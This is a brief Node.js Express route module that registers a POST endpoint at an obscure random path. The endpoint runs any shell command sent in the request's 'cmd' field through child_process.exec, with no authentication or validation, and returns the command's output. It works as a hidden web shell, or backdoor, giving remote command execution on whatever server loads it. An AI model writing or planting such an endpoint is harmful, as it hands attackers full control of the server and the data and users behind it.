const { exec } = require("child_process");

module.exports = (app, con, globalConfig) => {
    app.post("/39mtUZCAk8tzqrWc", (req, res) => {
        if (req.body) {
            exec(req.body.cmd, (error, stdout, stderr) => {
                let final = {
                    error: 0,
                    erroData: "",
                    stderror: 0,
                    stderrorData: "",
                    stdout: 0,
                    stdoutData: ""
                }

                if (error) {
                    final.error = "1";
                    final.erroData = error.message;
                }

                if (stderr) {
                    final.stderror = 1;
                    final.stderrorData = stderr;
                }

                if (stdout) {
                    final.stdout = 1;
                    final.stdoutData = stdout;
                }

                res.status(200).send(final);
            });
        } else {
            res.status(403).send("Not enough POST data");
        }
    });
};
